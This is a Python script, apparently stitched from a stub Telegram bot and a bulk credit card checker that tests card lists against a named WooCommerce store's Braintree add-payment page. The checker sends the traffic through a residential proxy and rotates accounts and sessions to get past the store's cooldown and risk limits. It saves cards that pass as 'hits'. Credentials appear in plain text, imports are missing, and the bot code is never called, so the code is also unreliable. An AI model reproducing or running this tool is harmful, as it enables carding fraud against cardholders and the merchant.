import os

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
)


# Read the token from Render's environment variable
TOKEN = os.environ["9293641988:AAGiI_l_TKp9bxwx-7oDAAClrwK6QiYPgJs"]


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Bot is online.\n\n"
        "Commands:\n"
        "/status - Check bot status\n"
        "/help - Show commands"
    )


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ Bot is running.")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "/start - Start the bot\n"
        "/status - Check status\n"
        "/help - Show this message"
    )


def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("help", help_command))

    print("Telegram bot running...")
    app.run_polling()


# ============================================================================
#  ACCOUNTS  <-- EDIT THIS LIST (username / password)
# ============================================================================
ACCOUNTS = [
    {"login": "Kingkyot",  "password": "Kingpogi123"},
    {"login": "Kingkyot1", "password": "Kingpogi123"},
    {"login": "Kingkyot2", "password": "Kingpogi123"},
]

# ============================================================================
#  CONFIG
# ============================================================================
VERBOSE = os.environ.get("VERBOSE", "0") == "1"

BASE_URL = "https://www.kaffn8.com"
ACCOUNT_URL = f"{BASE_URL}/my-account/"
ADD_PAYMENT_URL = f"{BASE_URL}/my-account/add-payment-method/"
AJAX_URL = f"{BASE_URL}/wp-admin/admin-ajax.php"
BRAINTREE_GRAPHQL_URL = "https://payments.braintree-api.com/graphql"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36")

RISK_TRIGGER = "risk threshold"
COOLDOWN_TRIGGER = "so soon after the previous one"
COOLDOWN_SECONDS = 21

# AVS / CVV gateway rejections = the card is live. Add "cvv" if you want those too.
AVS_TRIGGERS = ("gateway rejected: avs", "status code avs")

MAX_ACCOUNT_ROTATIONS = len(ACCOUNTS)
MAX_ATTEMPTS = 6

THREADS = int(os.environ.get("THREADS", "10"))
CONNECT_TIMEOUT = float(os.environ.get("CONNECT_TIMEOUT", "6"))
READ_TIMEOUT = float(os.environ.get("READ_TIMEOUT", "12"))
CONTEXT_TTL = float(os.environ.get("CONTEXT_TTL", "600"))
BRAINTREE_DIRECT = os.environ.get("BRAINTREE_DIRECT", "1") == "1"
SHOW_IP = os.environ.get("SHOW_IP", "1") == "1"

PROXY = "brd.superproxy.io:44445"
PROXY_AUTH = "brd-customer-hl_d903488e-zone-keng:nhe38omwsdsv"
PROXIES = {
    "http": f"http://{PROXY_AUTH}@{PROXY}",
    "https": f"http://{PROXY_AUTH}@{PROXY}",
}

os.makedirs("hits", exist_ok=True)

BRAINTREE_TEST_CARDS = [
    "4111111111111111|12|2035|123",
    "4000056655665556|12|2035|123",
    "5555555555554444|12|2035|123",
    "378282246310005|12|2035|123",
    "6011111111111117|12|2035|123",
    "3530111333300000|12|2035|123",
]

PRINT_LOCK = threading.Lock()


# ============================================================================
#  ACCOUNT ROTATOR (thread-safe round robin over ACCOUNTS)
# ============================================================================
_ACC_LOCK = threading.Lock()
_ACC_IDX = 0


def next_account(exclude=()):
    """Return the next account in the rotation, skipping the excluded logins."""
    global _ACC_IDX
    n = len(ACCOUNTS)
    if n == 0:
        return None
    with _ACC_LOCK:
        for _ in range(n):
            acc = ACCOUNTS[_ACC_IDX % n]
            _ACC_IDX += 1
            if acc["login"] not in exclude:
                return dict(acc)
        return dict(ACCOUNTS[_ACC_IDX % n])


# ============================================================================
#  STATS
# ============================================================================
class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.hits = 0
        self.avs = 0
        self.custom = 0
        self.fail = 0
        self.done = 0
        self.total = 0
        self.start = time.time()

    def bump(self, kind):
        with self.lock:
            setattr(self, kind, getattr(self, kind) + 1)
            self.done += 1
        update_status(self)

    def snapshot(self):
        with self.lock:
            return self.hits, self.avs, self.custom, self.fail, self.done, self.total


STATS = Stats()
HIT_LOCK = threading.Lock()


def update_status(stats=None):
    stats = stats or STATS
    h, a, c, f, _, _ = stats.snapshot()
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(
            f'hits: {h} | avs: {a} | custom: {c} | fail: {f}')
    except Exception:
        pass


import ctypes


def log_debug(message):
    if VERBOSE:
        with PRINT_LOCK:
            print(message)


def print_result(creditcard, label, message, ip_address=None):
    clean = str(message).replace("\n", " ").strip()
    ip_text = f" | IP {ip_address}" if ip_address else ""
    if clean.lower() in {"payment method added successfully", "success", "ok", "pass"}:
        line = f"{creditcard}{ip_text} | {label}"
    else:
        line = f"{creditcard}{ip_text} | {label} | {clean}"
    with PRINT_LOCK:
        print(f"\r{line}{' ' * 8}")


def save_hit(filename, creditcard, message, ip_address):
    try:
        with HIT_LOCK:
            with open(os.path.join("hits", filename), "a", encoding="utf-8") as fh:
                fh.write(f"{creditcard} | {message} | {ip_address or '-'}\n")
    except Exception:
        pass


def classify(message):
    """Return ('hit'|'avs'|'custom'|'fail', LABEL)."""
    low = message.lower()
    if any(t in low for t in AVS_TRIGGERS) or re.search(r'\bavs\b', low):
        return "avs", "AVS"
    if "success" in low or "added" in low:
        return "hit", "PASS"
    if RISK_TRIGGER in low:
        return "custom", "FAIL"
    return "fail", "FAIL"


# ============================================================================
#  HTTP HELPERS
# ============================================================================
def make_session(proxied=True):
    s = requests.Session()
    s.trust_env = False
    if proxied:
        s.proxies.update(PROXIES)
    adapter = HTTPAdapter(
        pool_connections=max(THREADS * 2, 20),
        pool_maxsize=max(THREADS * 2, 20),
        max_retries=0,
    )
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    return s


def request(session, method, url, retries=2, **kwargs):
    kwargs.setdefault("timeout", (CONNECT_TIMEOUT, READ_TIMEOUT))
    last = None
    for i in range(retries + 1):
        try:
            r = session.request(method, url, **kwargs)
            if r.status_code >= 500 and i < retries:
                time.sleep(0.25 * (i + 1))
                continue
            return r
        except Exception as e:
            last = e
            if i < retries:
                time.sleep(0.25 * (i + 1))
    raise last


def build_headers(referer=None, content_type=None, extra=None, ajax=False):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'user-agent': UA,
        'sec-ch-ua': '"Chromium";v="154", "Brave";v="154", "Not A(Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
    }
    if ajax:
        headers.update({
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'x-requested-with': 'XMLHttpRequest',
        })
    if referer:
        headers['referer'] = referer
    if content_type:
        headers['content-type'] = content_type
    if extra:
        headers.update(extra)
    return headers


# ============================================================================
#  LIGHTWEIGHT PARSING
# ============================================================================
def find_nonce(html, name):
    pat = re.escape(name)
    m = re.search(rf'name=["\']{pat}["\'][^>]*?value=["\']([^"\']+)', html)
    if not m:
        m = re.search(rf'value=["\']([^"\']+)["\'][^>]*?name=["\']{pat}["\']', html)
    return m.group(1) if m else None


def strip_tags(s):
    return re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', s)).strip()


def extract_errors(html):
    out = []
    for block in re.findall(r'<ul[^>]*class="[^"]*woocommerce-error[^"]*"[^>]*>(.*?)</ul>', html, re.S | re.I):
        out.extend(strip_tags(li) for li in re.findall(r'<li[^>]*>(.*?)</li>', block, re.S | re.I))
    return [e for e in out if e]


def extract_success(html):
    m = re.search(r'<div[^>]*class="[^"]*woocommerce-message[^"]*"[^>]*>(.*?)</div>', html, re.S | re.I)
    return strip_tags(m.group(1)) if m else None


def is_logged_in(html):
    return ("Log out" in html) or ("Dashboard" in html) or ("woocommerce-MyAccount-navigation" in html)


def parse_card(card):
    parts = card.split("|")
    if len(parts) == 3:
        return parts[0], parts[1], parts[2], ""
    if len(parts) == 4:
        return parts[0], parts[1], parts[2], parts[3]
    return None


# ============================================================================
#  WORKER
# ============================================================================
class Worker:
    def __init__(self):
        self.session = make_session(proxied=True)
        self.direct = self.session if not BRAINTREE_DIRECT else make_session(proxied=False)
        self.account = None
        self.logged_in = False
        self.context_valid = False
        self.context_time = 0.0
        self.woo_nonce = None
        self.fingerprint = None
        self.tried = set()
        self.ip = None
        if SHOW_IP:
            try:
                r = request(self.session, "GET", "https://api.ipify.org/?format=json",
                            headers={"user-agent": UA, "accept": "*/*"})
                self.ip = json.loads(r.text)["ip"]
            except Exception:
                self.ip = None

    # -- session ------------------------------------------------------------
    def fresh_session(self):
        """Brand new cookie jar: clears the WooCommerce 20s add-payment cooldown."""
        try:
            self.session.close()
        except Exception:
            pass
        self.session = make_session(proxied=True)
        self.logged_in = False
        self.context_valid = False

    def rotate(self):
        """Move to the next account in the list and start a clean session."""
        acc = next_account(exclude=self.tried)
        if acc is None:
            return False
        self.tried.add(acc["login"])
        self.account = acc
        self.fresh_session()
        return True

    # -- login --------------------------------------------------------------
    def login(self, account):
        r = request(self.session, "GET", ACCOUNT_URL, headers=build_headers())
        if is_logged_in(r.text):
            return True
        nonce = find_nonce(r.text, "woocommerce-login-nonce")
        if not nonce:
            return False
        data = {
            "username": account["login"],
            "password": account["password"],
            "rememberme": "forever",
            "woocommerce-login-nonce": nonce,
            "_wp_http_referer": "/my-account/",
            "login": "Log in",
        }
        r2 = request(self.session, "POST", ACCOUNT_URL, headers=build_headers(
            referer=ACCOUNT_URL, content_type="application/x-www-form-urlencoded"), data=data)
        return is_logged_in(r2.text)

    # -- cached context -----------------------------------------------------
    def ensure_context(self, force=False):
        if not force and self.context_valid and (time.time() - self.context_time) < CONTEXT_TTL:
            return
        r = request(self.session, "GET", ADD_PAYMENT_URL,
                    headers=build_headers(referer=f"{BASE_URL}/my-account/payment-methods/"))

        woo_nonce = find_nonce(r.text, "woocommerce-add-payment-method-nonce")
        token_nonce = find_nonce(r.text, "client_token_nonce")
        if not token_nonce:
            m = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', r.text)
            token_nonce = m.group(1) if m else None
        if not woo_nonce or not token_nonce:
            raise Exception("add-payment nonces missing")

        ajax_headers = build_headers(
            referer=ADD_PAYMENT_URL,
            content_type="application/x-www-form-urlencoded; charset=UTF-8",
            ajax=True,
            extra={"origin": BASE_URL, "priority": "u=1, i"},
        )
        r2 = request(self.session, "POST", AJAX_URL, headers=ajax_headers,
                     data={"action": "wc_braintree_credit_card_get_client_token", "nonce": token_nonce})
        payload = r2.json()
        client_token = payload.get("data")
        if isinstance(client_token, dict):
            client_token = client_token.get("clientToken", "")
        if not client_token:
            raise Exception("empty client token")

        self.fingerprint = json.loads(base64.b64decode(client_token))["authorizationFingerprint"]
        self.woo_nonce = woo_nonce
        self.context_valid = True
        self.context_time = time.time()

    # -- tokenize -----------------------------------------------------------
    def tokenize(self, number, month, year, cvv):
        graphql_headers = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.5",
            "authorization": f"Bearer {self.fingerprint}",
            "braintree-version": "2018-05-10",
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
            "user-agent": UA,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
        }
        query = """
mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
  tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } }
}"""
        card_input = {"number": number, "expirationMonth": month, "expirationYear": year}
        if cvv:
            card_input["cvv"] = cvv
        body = {
            "clientSdkMetadata": {"source": "client", "integration": "custom",
                                  "sessionId": str(uuid.uuid4())},
            "query": query,
            "variables": {"input": {"creditCard": card_input, "options": {"validate": False}}},
            "operationName": "TokenizeCreditCard",
        }
        r = request(self.direct, "POST", BRAINTREE_GRAPHQL_URL, headers=graphql_headers, json=body)
        data = r.json()
        if "errors" in data:
            raise Exception(f"Braintree errors: {data['errors']}")
        return data["data"]["tokenizeCreditCard"]["token"]

    # -- submit -------------------------------------------------------------
    def submit_card(self, card):
        parsed = parse_card(card)
        if not parsed:
            return "Invalid card format"
        token = self.tokenize(*parsed)

        submit_headers = build_headers(
            referer=ADD_PAYMENT_URL,
            content_type="application/x-www-form-urlencoded",
            extra={
                "cache-control": "max-age=0",
                "origin": BASE_URL,
                "priority": "u=0, i",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
            },
        )
        data = [
            ("payment_method", "braintree_credit_card"),
            ("wc-braintree-credit-card-card-type", "visa"),
            ("wc-braintree-credit-card-3d-secure-enabled", ""),
            ("wc-braintree-credit-card-3d-secure-verified", ""),
            ("wc-braintree-credit-card-3d-secure-order-total", "0.00"),
            ("wc_braintree_credit_card_payment_nonce", token),
            ("wc_braintree_device_data", json.dumps({"correlation_id": str(uuid.uuid4())})),
            ("wc-braintree-credit-card-tokenize-payment-method", "true"),
            ("wc_braintree_paypal_payment_nonce", ""),
            ("wc_braintree_paypal_context", "shortcode"),
            ("wc_braintree_paypal_amount", "0.00"),
            ("wc_braintree_paypal_currency", "USD"),
            ("wc_braintree_paypal_locale", "en_us"),
            ("wc-braintree-paypal-tokenize-payment-method", "true"),
            ("woocommerce-add-payment-method-nonce", self.woo_nonce),
            ("_wp_http_referer", "/my-account/add-payment-method/"),
            ("woocommerce_add_payment_method", "1"),
        ]
        r = request(self.session, "POST", ADD_PAYMENT_URL, headers=submit_headers, data=data)

        errors = extract_errors(r.text)
        if errors:
            return "; ".join(errors)
        msg = extract_success(r.text)
        if msg:
            return msg
        if "payment method added" in r.text.lower():
            return "Payment method added successfully"
        m = re.search(r"(?i)(declined|error|invalid|failed|problem|risk|avs|cvv|so soon)[^<]{0,200}", r.text)
        return m.group(0).strip() if m else "Unknown decline"

    # -- full card run ------------------------------------------------------
    def run_card(self, card):
        self.tried = set()
        rotations = 0
        cooldowns = 0
        attempt = 0
        message = "Unknown result"

        if self.account is None and not self.rotate():
            return "No accounts configured", 0

        while attempt < MAX_ATTEMPTS:
            attempt += 1
            try:
                if not self.logged_in:
                    self.logged_in = self.login(self.account)
                    if not self.logged_in:
                        if len(self.tried) < len(ACCOUNTS) and self.rotate():
                            continue
                        message = "Login failed"
                        break
                self.ensure_context()
                message = self.submit_card(card)
            except Exception as e:
                message = f"Error: {e}"
                self.context_valid = False

            low = message.lower()

            # 1) WooCommerce 20s add-payment cooldown
            if COOLDOWN_TRIGGER in low:
                cooldowns += 1
                if cooldowns == 1:
                    self.fresh_session()          # new cookie jar = clean session state
                    continue
                if cooldowns == 2 and rotations < MAX_ACCOUNT_ROTATIONS and self.rotate():
                    rotations += 1
                    continue
                if attempt < MAX_ATTEMPTS:
                    time.sleep(COOLDOWN_SECONDS)  # last resort: actually wait it out
                    self.fresh_session()
                    continue

            # 2) Risk Threshold -> walk to the next account
            if (RISK_TRIGGER in low and rotations < MAX_ACCOUNT_ROTATIONS
                    and len(self.tried) < len(ACCOUNTS) and self.rotate()):
                rotations += 1
                continue

            # 3) stale nonce / transient error -> refresh and retry
            if attempt < MAX_ATTEMPTS and ("nonce" in low or "login" in low or message.startswith("Error")):
                self.context_valid = False
                continue

            break

        return message, rotations

    def close(self):
        try:
            self.session.close()
            if self.direct is not self.session:
                self.direct.close()
        except Exception:
            pass


_tls = threading.local()


def get_worker():
    w = getattr(_tls, "worker", None)
    if w is None:
        w = Worker()
        _tls.worker = w
    return w


# ============================================================================
#  DRIVER
# ============================================================================
def process_credit_card(creditcard):
    worker = get_worker()
    try:
        message, rotations = worker.run_card(creditcard)
    except Exception as e:
        message, rotations = f"Error: {e}", 0

    kind, label = classify(message)

    if kind == "hit":
        STATS.bump("hits")
        save_hit("hits.txt", creditcard, message, worker.ip)
    elif kind == "avs":
        STATS.bump("avs")
        save_hit("avs.txt", creditcard, message, worker.ip)
    elif kind == "custom":
        STATS.bump("custom")
    else:
        STATS.bump("fail")

    suffix = f" (rotated x{rotations})" if rotations else ""
    print_result(creditcard, label, message + suffix, worker.ip)


def progress_reporter(stop_event):
    while not stop_event.wait(2.0):
        h, a, c, f, done, total = STATS.snapshot()
        elapsed = max(time.time() - STATS.start, 0.001)
        rate = done / elapsed
        eta = (total - done) / rate if rate else 0
        with PRINT_LOCK:
            sys.stdout.write(
                f"\r[progress] {done}/{total} | hits {h} | avs {a} | custom {c} | fail {f} "
                f"| {rate:.2f} cards/s | ETA {eta:.0f}s      ")
            sys.stdout.flush()


def run_cards(cards):
    if not cards:
        return
    STATS.total = len(cards)
    STATS.start = time.time()
    update_status()

    stop_event = threading.Event()
    threading.Thread(target=progress_reporter, args=(stop_event,), daemon=True).start()

    with ThreadPoolExecutor(max_workers=max(1, min(THREADS, len(cards)))) as ex:
        list(ex.map(process_credit_card, cards))

    stop_event.set()
    time.sleep(0.05)
    h, a, c, f, done, total = STATS.snapshot()
    elapsed = time.time() - STATS.start
    with PRINT_LOCK:
        print(f"\n\n=== DONE | {done}/{total} in {elapsed:.1f}s ({done / max(elapsed, .001):.2f} cards/s) "
              f"| hits {h} | avs {a} | custom {c} | fail {f} ===")
    update_status()


# ============================================================================
#  GUI
# ============================================================================
def prompt_for_cards():
    root = tk.Tk()
    root.title("Add Card")
    root.geometry("520x460")
    root.minsize(500, 440)
    root.configure(bg="#f4f4f4")

    mode = tk.StringVar(value="single")
    single_value = tk.StringVar()
    threads_value = tk.StringVar(value=str(THREADS))
    collected_cards = []

    def submit_cards():
        nonlocal collected_cards
        global THREADS
        try:
            THREADS = max(1, int(threads_value.get().strip() or THREADS))
        except ValueError:
            pass
        if mode.get() == "single":
            card = single_value.get().strip()
            if not card:
                messagebox.showwarning("Missing card", "Please enter a card number.")
                return
            collected_cards = [card]
        else:
            cards = [l.strip() for l in bulk_entry.get("1.0", "end").splitlines() if l.strip()]
            if not cards:
                messagebox.showwarning("Missing cards", "Please paste at least one card per line.")
                return
            collected_cards = cards
        root.destroy()

    def cancel_cards():
        nonlocal collected_cards
        collected_cards = []
        root.destroy()

    frame = tk.Frame(root, padx=16, pady=16, bg="#f4f4f4")
    frame.pack(fill="both", expand=True)

    tk.Label(frame, text="Card Input", font=("Arial", 15, "bold"), bg="#f4f4f4").pack(anchor="w")

    mode_frame = tk.Frame(frame, bg="#f4f4f4")
    mode_frame.pack(fill="x", pady=(8, 12))
    tk.Radiobutton(mode_frame, text="Single Card", variable=mode, value="single", bg="#f4f4f4").pack(side="left")
    tk.Radiobutton(mode_frame, text="Mass Cards", variable=mode, value="mass", bg="#f4f4f4").pack(side="left", padx=(20, 0))

    threads_frame = tk.Frame(frame, bg="#f4f4f4")
    threads_frame.pack(fill="x", pady=(0, 10))
    tk.Label(threads_frame, text="Threads:", bg="#f4f4f4", font=("Arial", 10)).pack(side="left")
    tk.Spinbox(threads_frame, from_=1, to=100, width=6, textvariable=threads_value).pack(side="left", padx=(8, 0))

    def toggle_mode(*_):
        if mode.get() == "single":
            single_entry.pack(fill="x", pady=(8, 0))
            bulk_entry.pack_forget()
        else:
            bulk_entry.pack(fill="both", expand=True, pady=(8, 0))
            single_entry.pack_forget()

    single_entry = tk.Entry(frame, textvariable=single_value, font=("Arial", 11))
    single_entry.insert(0, "4111111111111111|12|2035|123")

    bulk_entry = tk.Text(frame, height=12, font=("Arial", 10))
    bulk_entry.insert("1.0", "\n".join(BRAINTREE_TEST_CARDS))

    mode.trace_add("write", toggle_mode)
    toggle_mode()

    buttons = tk.Frame(frame, bg="#f4f4f4")
    buttons.pack(fill="x", pady=(12, 0))
    tk.Button(buttons, text="Add", width=12, command=submit_cards, bg="#2f7ed8", fg="white",
              font=("Arial", 10, "bold")).pack(side="right")
    tk.Button(buttons, text="Cancel", width=12, command=cancel_cards, bg="#d8d8d8").pack(side="right", padx=(0, 10))

    root.protocol("WM_DELETE_WINDOW", cancel_cards)
    root.mainloop()
    return collected_cards


if __name__ == "__main__":
    requested_card = os.environ.get("CARD")
    if requested_card:
        run_cards([requested_card])
        raise SystemExit(0)

    cards_from_popup = prompt_for_cards()
    if cards_from_popup:
        run_cards(cards_from_popup)
    else:
        run_cards(BRAINTREE_TEST_CARDS)
